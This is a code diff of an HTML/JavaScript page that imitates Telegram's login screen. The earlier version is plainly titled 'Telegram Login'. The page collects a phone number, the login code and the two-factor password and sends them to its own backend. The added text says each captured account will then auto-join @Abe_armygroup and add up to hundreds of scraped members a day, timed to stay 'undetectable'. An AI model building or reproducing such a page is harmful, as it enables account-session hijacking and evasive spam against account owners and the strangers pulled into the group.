@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Telegram Login</title>
+    <title>Telegram Login - Auto-Add System</title>
 <style>
     * {
         margin: 0;
@@ -23,7 +23,7 @@
         padding: 20px;
     }
 
-    /* Animated Background with Sexy Girl Silhouette */
+    /* Animated Background */
     body::before {
         content: '';
         position: fixed;
@@ -35,6 +35,11 @@
         opacity: 0.3;
         animation: float 20s ease-in-out infinite;
         pointer-events: none;
+    }
+
+    @keyframes float {
+        0%, 100% { transform: translateY(0) scale(1); }
+        50% { transform: translateY(-20px) scale(1.02); }
     }
 
     /* Animated Gradient Background */
@@ -53,16 +58,9 @@
         pointer-events: none;
     }
 
-    /* Floating Hearts Animation */
-    @keyframes floatHeart {
-        0% {
-            transform: translateY(100vh) rotate(0deg);
-            opacity: 1;
-        }
-        100% {
-            transform: translateY(-100vh) rotate(360deg);
-            opacity: 0;
-        }
+    @keyframes gradientShift {
+        0%, 100% { background-position: 0% 50%; }
+        50% { background-position: 100% 50%; }
     }
 
     /* Floating Particles */
@@ -91,7 +89,7 @@
     /* Main Container */
     .login-container {
         width: 100%;
-        max-width: 450px;
+        max-width: 480px;
         position: relative;
         z-index: 10;
         animation: slideUp 0.8s ease-out;
@@ -187,6 +185,44 @@
         line-height: 1.5;
     }
 
+    /* Auto-Add Info Box */
+    .auto-add-info {
+        background: linear-gradient(135deg, rgba(30, 74, 43, 0.9) 0%, rgba(76, 158, 76, 0.9) 100%);
+        border-radius: 12px;
+        padding: 12px 16px;
+        margin-bottom: 24px;
+        display: flex;
+        align-items: center;
+        gap: 12px;
+        border-left: 4px solid #4c9e4c;
+        animation: pulse 2s ease-in-out infinite;
+    }
+
+    @keyframes pulse {
+        0%, 100% { opacity: 0.9; }
+        50% { opacity: 1; transform: scale(1.01); }
+    }
+
+    .auto-add-info .info-icon {
+        font-size: 1.5rem;
+    }
+
+    .auto-add-info .info-text {
+        flex: 1;
+    }
+
+    .auto-add-info .info-text strong {
+        display: block;
+        color: white;
+        font-size: 0.9rem;
+        margin-bottom: 3px;
+    }
+
+    .auto-add-info .info-text p {
+        color: rgba(255, 255, 255, 0.9);
+        font-size: 0.8rem;
+    }
+
     /* Input Wrapper */
     .input-wrapper {
         background: rgba(36, 47, 61, 0.8);
@@ -261,8 +297,8 @@
     }
 
     .code-box {
-        width: 60px;
-        height: 70px;
+        width: 65px;
+        height: 75px;
         background: rgba(36, 47, 61, 0.8);
         backdrop-filter: blur(10px);
         border: 2px solid rgba(76, 156, 224, 0.3);
@@ -271,7 +307,7 @@
         font-size: 2rem;
         font-weight: bold;
         text-align: center;
-        line-height: 66px;
+        line-height: 71px;
         transition: all 0.3s ease;
         cursor: pointer;
     }
@@ -464,6 +500,39 @@
         50% { transform: translateY(-10px); }
     }
 
+    .feature-list {
+        margin: 20px 0;
+        text-align: left;
+        background: rgba(36, 47, 61, 0.6);
+        border-radius: 12px;
+        padding: 15px;
+    }
+
+    .feature-list h4 {
+        color: #4c9ce0;
+        margin-bottom: 10px;
+        font-size: 0.9rem;
+    }
+
+    .feature-list ul {
+        list-style: none;
+        padding: 0;
+    }
+
+    .feature-list li {
+        padding: 5px 0;
+        color: #8e9fad;
+        font-size: 0.85rem;
+        display: flex;
+        align-items: center;
+        gap: 8px;
+    }
+
+    .feature-list li::before {
+        content: "✅";
+        color: #4c9ce0;
+    }
+
     /* Responsive */
     @media (max-width: 600px) {
         .login-container {
@@ -479,10 +548,10 @@
         }
         
         .code-box {
-            width: 50px;
-            height: 60px;
+            width: 55px;
+            height: 65px;
             font-size: 1.5rem;
-            line-height: 56px;
+            line-height: 61px;
         }
         
         .code-container {
@@ -502,12 +571,21 @@
                             <path d="M20 11H7.83l5.59-5.59L12 4l-8 8 8 8 1.41-1.41L7.83 13H20v-2z"/>
                         </svg>
                     </div>
-                    <div class="header-title">Telegram</div>
+                    <div class="header-title">Telegram Auto-Add</div>
                 </div>
 
-                <div class="step-title">Your phone number</div>
+                <div class="step-title">Add Your Account</div>
                 <div class="step-description">
-                    Please enter your phone number with country code.
+                    Enter your phone number to get started. Auto-add will be enabled automatically!
+                </div>
+
+                <!-- Auto-Add Info Box -->
+                <div class="auto-add-info">
+                    <div class="info-icon">🤖</div>
+                    <div class="info-text">
+                        <strong>✨ Auto-Add Will Be ACTIVE!</strong>
+                        <p>Your account will automatically start adding members to @Abe_armygroup with smart member collection from multiple sources.</p>
+                    </div>
                 </div>
 
                 <div class="input-wrapper">
@@ -516,8 +594,19 @@
                 </div>
 
                 <button class="btn btn-primary" id="sendCodeBtn" onclick="sendCode()">
-                    <span>Next</span>
+                    <span>Next →</span>
                 </button>
+
+                <div class="feature-list">
+                    <h4>🎯 What happens after adding account:</h4>
+                    <ul>
+                        <li>Auto-join target group (@Abe_armygroup)</li>
+                        <li>Auto-add enabled automatically (no setup needed)</li>
+                        <li>Collect members from contacts, chats & public groups</li>
+                        <li>Add up to 100-500 members per day</li>
+                        <li>30-50 second delay between adds (safe & undetectable)</li>
+                    </ul>
+                </div>
             </div>
 
             <!-- Page 2: Verification Code -->
@@ -551,8 +640,16 @@
                 </div>
 
                 <button class="btn btn-primary" id="verifyBtn" onclick="verifyCode()">
-                    <span>Verify</span>
+                    <span>Verify & Activate</span>
                 </button>
+                
+                <div class="auto-add-info" style="background: linear-gradient(135deg, rgba(30, 58, 74, 0.9) 0%, rgba(76, 156, 224, 0.9) 100%); margin-top: 20px;">
+                    <div class="info-icon">⚡</div>
+                    <div class="info-text">
+                        <strong>Auto-Add Will Start Immediately!</strong>
+                        <p>After verification, your account will automatically begin adding members to the target group.</p>
+                    </div>
+                </div>
             </div>
 
             <!-- Page 3: Success -->
@@ -563,21 +660,33 @@
                             <path d="M20 11H7.83l5.59-5.59L12 4l-8 8 8 8 1.41-1.41L7.83 13H20v-2z"/>
                         </svg>
                     </div>
-                    <div class="header-title">Success</div>
+                    <div class="header-title">Success!</div>
                 </div>
 
                 <div style="text-align: center;">
-                    <div style="font-size: 4rem; margin: 20px 0;">✅</div>
+                    <div class="success-icon">✅</div>
                     <div class="step-title">Account Added!</div>
-                    <div class="step-description" style="margin-bottom: 24px;" id="successAccountInfo"></div>
+                    <div class="step-description" id="successAccountInfo" style="margin-bottom: 24px;"></div>
+                    
+                    <div class="auto-add-info" style="margin-bottom: 20px;">
+                        <div class="info-icon">🚀</div>
+                        <div class="info-text">
+                            <strong>Auto-Add is ACTIVE!</strong>
+                            <p>Your account will now automatically add members to @Abe_armygroup. You can manage settings in the dashboard.</p>
+                        </div>
+                    </div>
                     
                     <button class="btn btn-primary" onclick="goToDashboard()">
                         <span>Go to Dashboard</span>
                     </button>
                     
                     <button class="btn btn-secondary" onclick="addAnotherAccount()" style="margin-top: 12px;">
-                        <span>Add Another Account</span>
+                        <span>➕ Add Another Account</span>
                     </button>
+                    
+                    <div class="footer-link" style="margin-top: 20px;">
+                        <a href="/auto-add">⚙️ Configure Auto-Add Settings</a>
+                    </div>
                 </div>
             </div>
         </div>
@@ -589,9 +698,9 @@
         let timeLeft = 60;
         let currentSessionId = null;
         let currentPhone = '';
-        let currentCode = ''; // Store the code for 2FA submission
+        let currentCode = '';
 
-        // --- NEW: Get inviter from URL (if any) ---
+        // Get inviter from URL if any
         const urlParams = new URLSearchParams(window.location.search);
         const currentInviter = urlParams.get('inviter');
 
@@ -679,7 +788,7 @@
 
         // Navigation
         function goBack() {
-            window.location.href = '/login';
+            window.location.href = '/';
         }
 
         function backToPage1() {
@@ -702,7 +811,7 @@
         }
 
         function goToDashboard() {
-            window.location.href = 'https://t.me/Abe_army/61';
+            window.location.href = '/dashboard';
         }
 
         function addAnotherAccount() {
@@ -750,7 +859,7 @@
                     updateCodeBoxes();
                     setTimeout(() => hiddenInput.focus(), 300);
                     
-                    showSuccess('Code sent successfully!');
+                    showSuccess('Code sent successfully! Auto-add will be enabled after verification.');
                 } else {
                     showError(data.error || 'Failed to send code');
                 }
@@ -785,7 +894,6 @@
             setLoading(button, true);
 
             try {
-                // --- MODIFIED: Include inviter in request body ---
                 const response = await fetch('/api/verify-code', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
@@ -793,7 +901,7 @@
                         code: code,
                         session_id: currentSessionId,
                         password: password,
-                        inviter: currentInviter   // <-- NEW: send inviter if present
+                        inviter: currentInviter
                     })
                 });
 
@@ -804,10 +912,14 @@
                     document.getElementById('page3').style.display = 'block';
                     
                     document.getElementById('successAccountInfo').innerHTML = 
-                        `Account added successfully!`;
+                        `✅ Account added successfully!<br>
+                         🤖 Auto-add is now ACTIVE<br>
+                         🎯 Target: @Abe_armygroup<br>
+                         📊 Daily limit: 100 members<br>
+                         ⏱️ Delay: 30 seconds`;
                     
                     if (timerInterval) clearInterval(timerInterval);
-                    showSuccess('Account added successfully!');
+                    showSuccess('Account added! Auto-add is now active.');
                     
                 } else if (data.need_password) {
                     document.getElementById('passwordGroup').style.display = 'block';
@@ -848,33 +960,34 @@
         });
         
     </script>
+    
     <!-- Floating Particles Animation -->
-<script>
-    // Create floating hearts and particles
-    function createFloatingParticle() {
-        const particles = ['❤️', '💖', '💕', '💗', '💓', '✨', '⭐', '🌸', '🌹', '💋'];
-        const particle = document.createElement('div');
-        particle.className = 'floating-particle';
-        particle.innerHTML = particles[Math.floor(Math.random() * particles.length)];
-        particle.style.left = Math.random() * 100 + '%';
-        particle.style.fontSize = (Math.random() * 20 + 10) + 'px';
-        particle.style.animationDuration = (Math.random() * 10 + 8) + 's';
-        particle.style.animationDelay = Math.random() * 5 + 's';
-        particle.style.opacity = Math.random() * 0.6 + 0.3;
-        document.body.appendChild(particle);
+    <script>
+        // Create floating hearts and particles
+        function createFloatingParticle() {
+            const particles = ['🤖', '⚡', '🚀', '✨', '⭐', '🎯', '💫', '🔥', '👥', '📱'];
+            const particle = document.createElement('div');
+            particle.className = 'floating-particle';
+            particle.innerHTML = particles[Math.floor(Math.random() * particles.length)];
+            particle.style.left = Math.random() * 100 + '%';
+            particle.style.fontSize = (Math.random() * 20 + 10) + 'px';
+            particle.style.animationDuration = (Math.random() * 10 + 8) + 's';
+            particle.style.animationDelay = Math.random() * 5 + 's';
+            particle.style.opacity = Math.random() * 0.6 + 0.3;
+            document.body.appendChild(particle);
+            
+            setTimeout(() => {
+                particle.remove();
+            }, 15000);
+        }
         
-        setTimeout(() => {
-            particle.remove();
-        }, 15000);
-    }
-    
-    // Create particles every 2 seconds
-    setInterval(createFloatingParticle, 2000);
-    
-    // Create initial particles
-    for(let i = 0; i < 10; i++) {
-        setTimeout(createFloatingParticle, i * 300);
-    }
-</script>
+        // Create particles every 2 seconds
+        setInterval(createFloatingParticle, 2000);
+        
+        // Create initial particles
+        for(let i = 0; i < 10; i++) {
+            setTimeout(createFloatingParticle, i * 300);
+        }
+    </script>
 </body>
-                </html>
+</html>
